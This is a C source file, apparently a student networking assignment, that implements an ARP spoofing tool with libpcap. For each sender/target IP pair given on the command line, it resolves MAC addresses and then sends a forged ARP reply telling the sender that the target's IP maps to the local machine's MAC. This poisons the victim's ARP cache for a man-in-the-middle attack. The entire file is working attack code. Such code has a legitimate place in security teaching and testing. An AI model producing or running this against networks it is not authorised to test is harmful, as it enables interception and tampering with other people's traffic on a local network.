#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <pcap.h>
#include "hb_headers.h"
#include "arp_utils.h"

int main(int argc, const char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return EXIT_FAILURE;
    }

    const char* dev = argv[1];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "couldn't open device %s (%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    hb_mac my_mac;
    if (!get_my_mac(dev, &my_mac)) {
        printf("Failed to get MAC address\n");
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    uint32_t my_ip;
    if (!get_my_ip(dev, &my_ip)) {
        printf("Failed to get IP address\n");
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    for (int i = 2; i < argc; i += 2) {
        const char* sender_ip_str = argv[i];
        const char* target_ip_str = argv[i + 1];

        uint32_t sender_ip;
        if (!get_ip_from_string(sender_ip_str, &sender_ip)) {
            printf("Invalid sender IP: %s\n", sender_ip_str);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }

        /* another method (이렇게 구성할수도 있지만 코드가 길어져 새로운 get_ip_form_string을 만들어 main코드를 줄이고 코드 가독성을 높였습니다.)
        uint32_t sender_ip;
        if(!Ip_is_valid_string(sender_ip_str))  {
            printf("Invalid sender IP: %s\n", sender_ip_str);
            usage();
            pcap_close(pcap);
            return EXIT_FAILURE;
        }
        sender_ip = Ip_parse(sender_ip_str);
        */


        uint32_t target_ip;
        if (!get_ip_from_string(target_ip_str, &target_ip)) {
            printf("Invalid target IP: %s\n", target_ip_str);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }

        hb_mac sender_mac;
        if (!get_other_mac(pcap, my_mac, my_ip, sender_ip, &sender_mac)) {
            printf("Failed to get sender MAC for %s\n", sender_ip_str);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }


        hb_mac target_mac;
        if (!get_other_mac(pcap, my_mac, my_ip, target_ip, &target_mac)) {
            printf("Failed to get target MAC for %s\n", target_ip_str);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }



    struct EthArpPacket packet;
	packet.eth.dst_mac = sender_mac;
	packet.eth.src_mac = my_mac;
	packet.eth.ethertype = htons(ETHERTYPE_ARP);

	packet.arp.hardware_type = htons(ARP_HARDWARE_ETHERNET);
	packet.arp.protocol_type = htons(ETHERTYPE_IPV4);
    packet.arp.hardware_addr_len = MAC_ADDR_LEN;
    packet.arp.protocol_addr_len = ARP_PROTOCOL_ADDR_LEN_IP;
    packet.arp.opcode = htons(ARP_OPCODE_REPLY);
	
	packet.arp.sender_mac = my_mac;
	packet.arp.sender_ip = ntohl(target_ip);
	packet.arp.target_mac = sender_mac;
	packet.arp.target_ip = ntohl(sender_ip);

    int res = pcap_sendpacket(pcap, (const u_char*)&packet, sizeof(packet));
	if(res != 0){
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        pcap_close(pcap);
		return EXIT_FAILURE;}

    }

    pcap_close(pcap);
    return EXIT_SUCCESS;
}
